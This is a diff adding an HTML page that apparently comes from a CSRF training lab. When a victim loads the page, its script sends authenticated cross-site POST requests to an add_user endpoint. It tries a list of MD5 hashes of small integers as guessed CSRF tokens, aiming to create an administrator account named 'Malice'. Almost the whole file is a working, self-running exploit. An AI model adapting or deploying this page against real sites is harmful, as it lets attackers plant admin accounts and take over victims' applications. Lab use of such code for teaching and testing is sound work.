@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Tokens Bruteforce</title>
+</head>
+<body>
+    <script>
+        function bruteLoop(TList) {
+            for (var i = 0; i < TList.length; i++) {
+                console.info("Testing: " + TList[i]);
+                XHRPost(TList[i]);
+            }
+        }
+
+        function encodePOSTParameters(pParametersObject) {
+            let encodedPOSTParams = [];
+            for(let key in pParametersObject) {
+                encodedPOSTParams.push(`${key}=${pParametersObject[key]}`); 
+            }
+            return encodedPOSTParams.join('&');
+        }
+
+        function XHRPost(pToken) {
+            var http = new XMLHttpRequest();
+            var url = "http://{LABID}.csrf.labs/add_user.php";
+            
+            // POST reques parameters
+            params = {
+                "name" : "Malice",
+                "surname" : "Smith",
+                "email" : "malice@hacker.site",
+                "role" : "ADMIN",
+                "submit" : "",
+                "CSRFToken" : pToken,
+            };
+        
+            
+            http.open("POST", url, true);
+            http.withCredentials = 'true';
+            //Send the proper header information along with the request
+            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            http.onreadystatechange = function() {
+                if (http.readyState > 1) {//We don't care about responses
+                    //console.warn("Aborted " + token + " with status " + http.readyState);
+                    //http.abort();
+                }
+            }
+
+            http.send(encodePOSTParameters(params));
+        }
+
+        // var tokens = document.getElementById('tokens').value.replace(/\s+/gm, '\n').split('\n');
+        // tokens = tokens.filter(Boolean); // Remove empty lines
+        
+        var tokens = [
+            // Put tokens here
+            '1679091c5a880faf6fb5e6087eb1b2dc',
+            '45c48cce2e2d7fbdea1afc51c7c6ad26',
+            '8f14e45fceea167a5a36dedd4bea2543',
+            'a87ff679a2f3e71d9181a67b7542122c',
+            'c4ca4238a0b923820dcc509a6f75849b',
+            'c81e728d9d4c2f636f067f89cc14862c',
+            'c9f0f895fb98ab9159f51fd0297e236d',
+            'cfcd208495d565ef66e7dff9f98764da',
+            'd3d9446802a44259755d38e6d163e820',
+            'e4da3b7fbbce2345d7772b0674a318d5',
+            'eccbc87e4b5ce2fe28308fd9f2a7baf3',
+        ];
+
+        // Brute Loop
+        bruteLoop(tokens);
+    </script>
+    
+</body>
+</html>
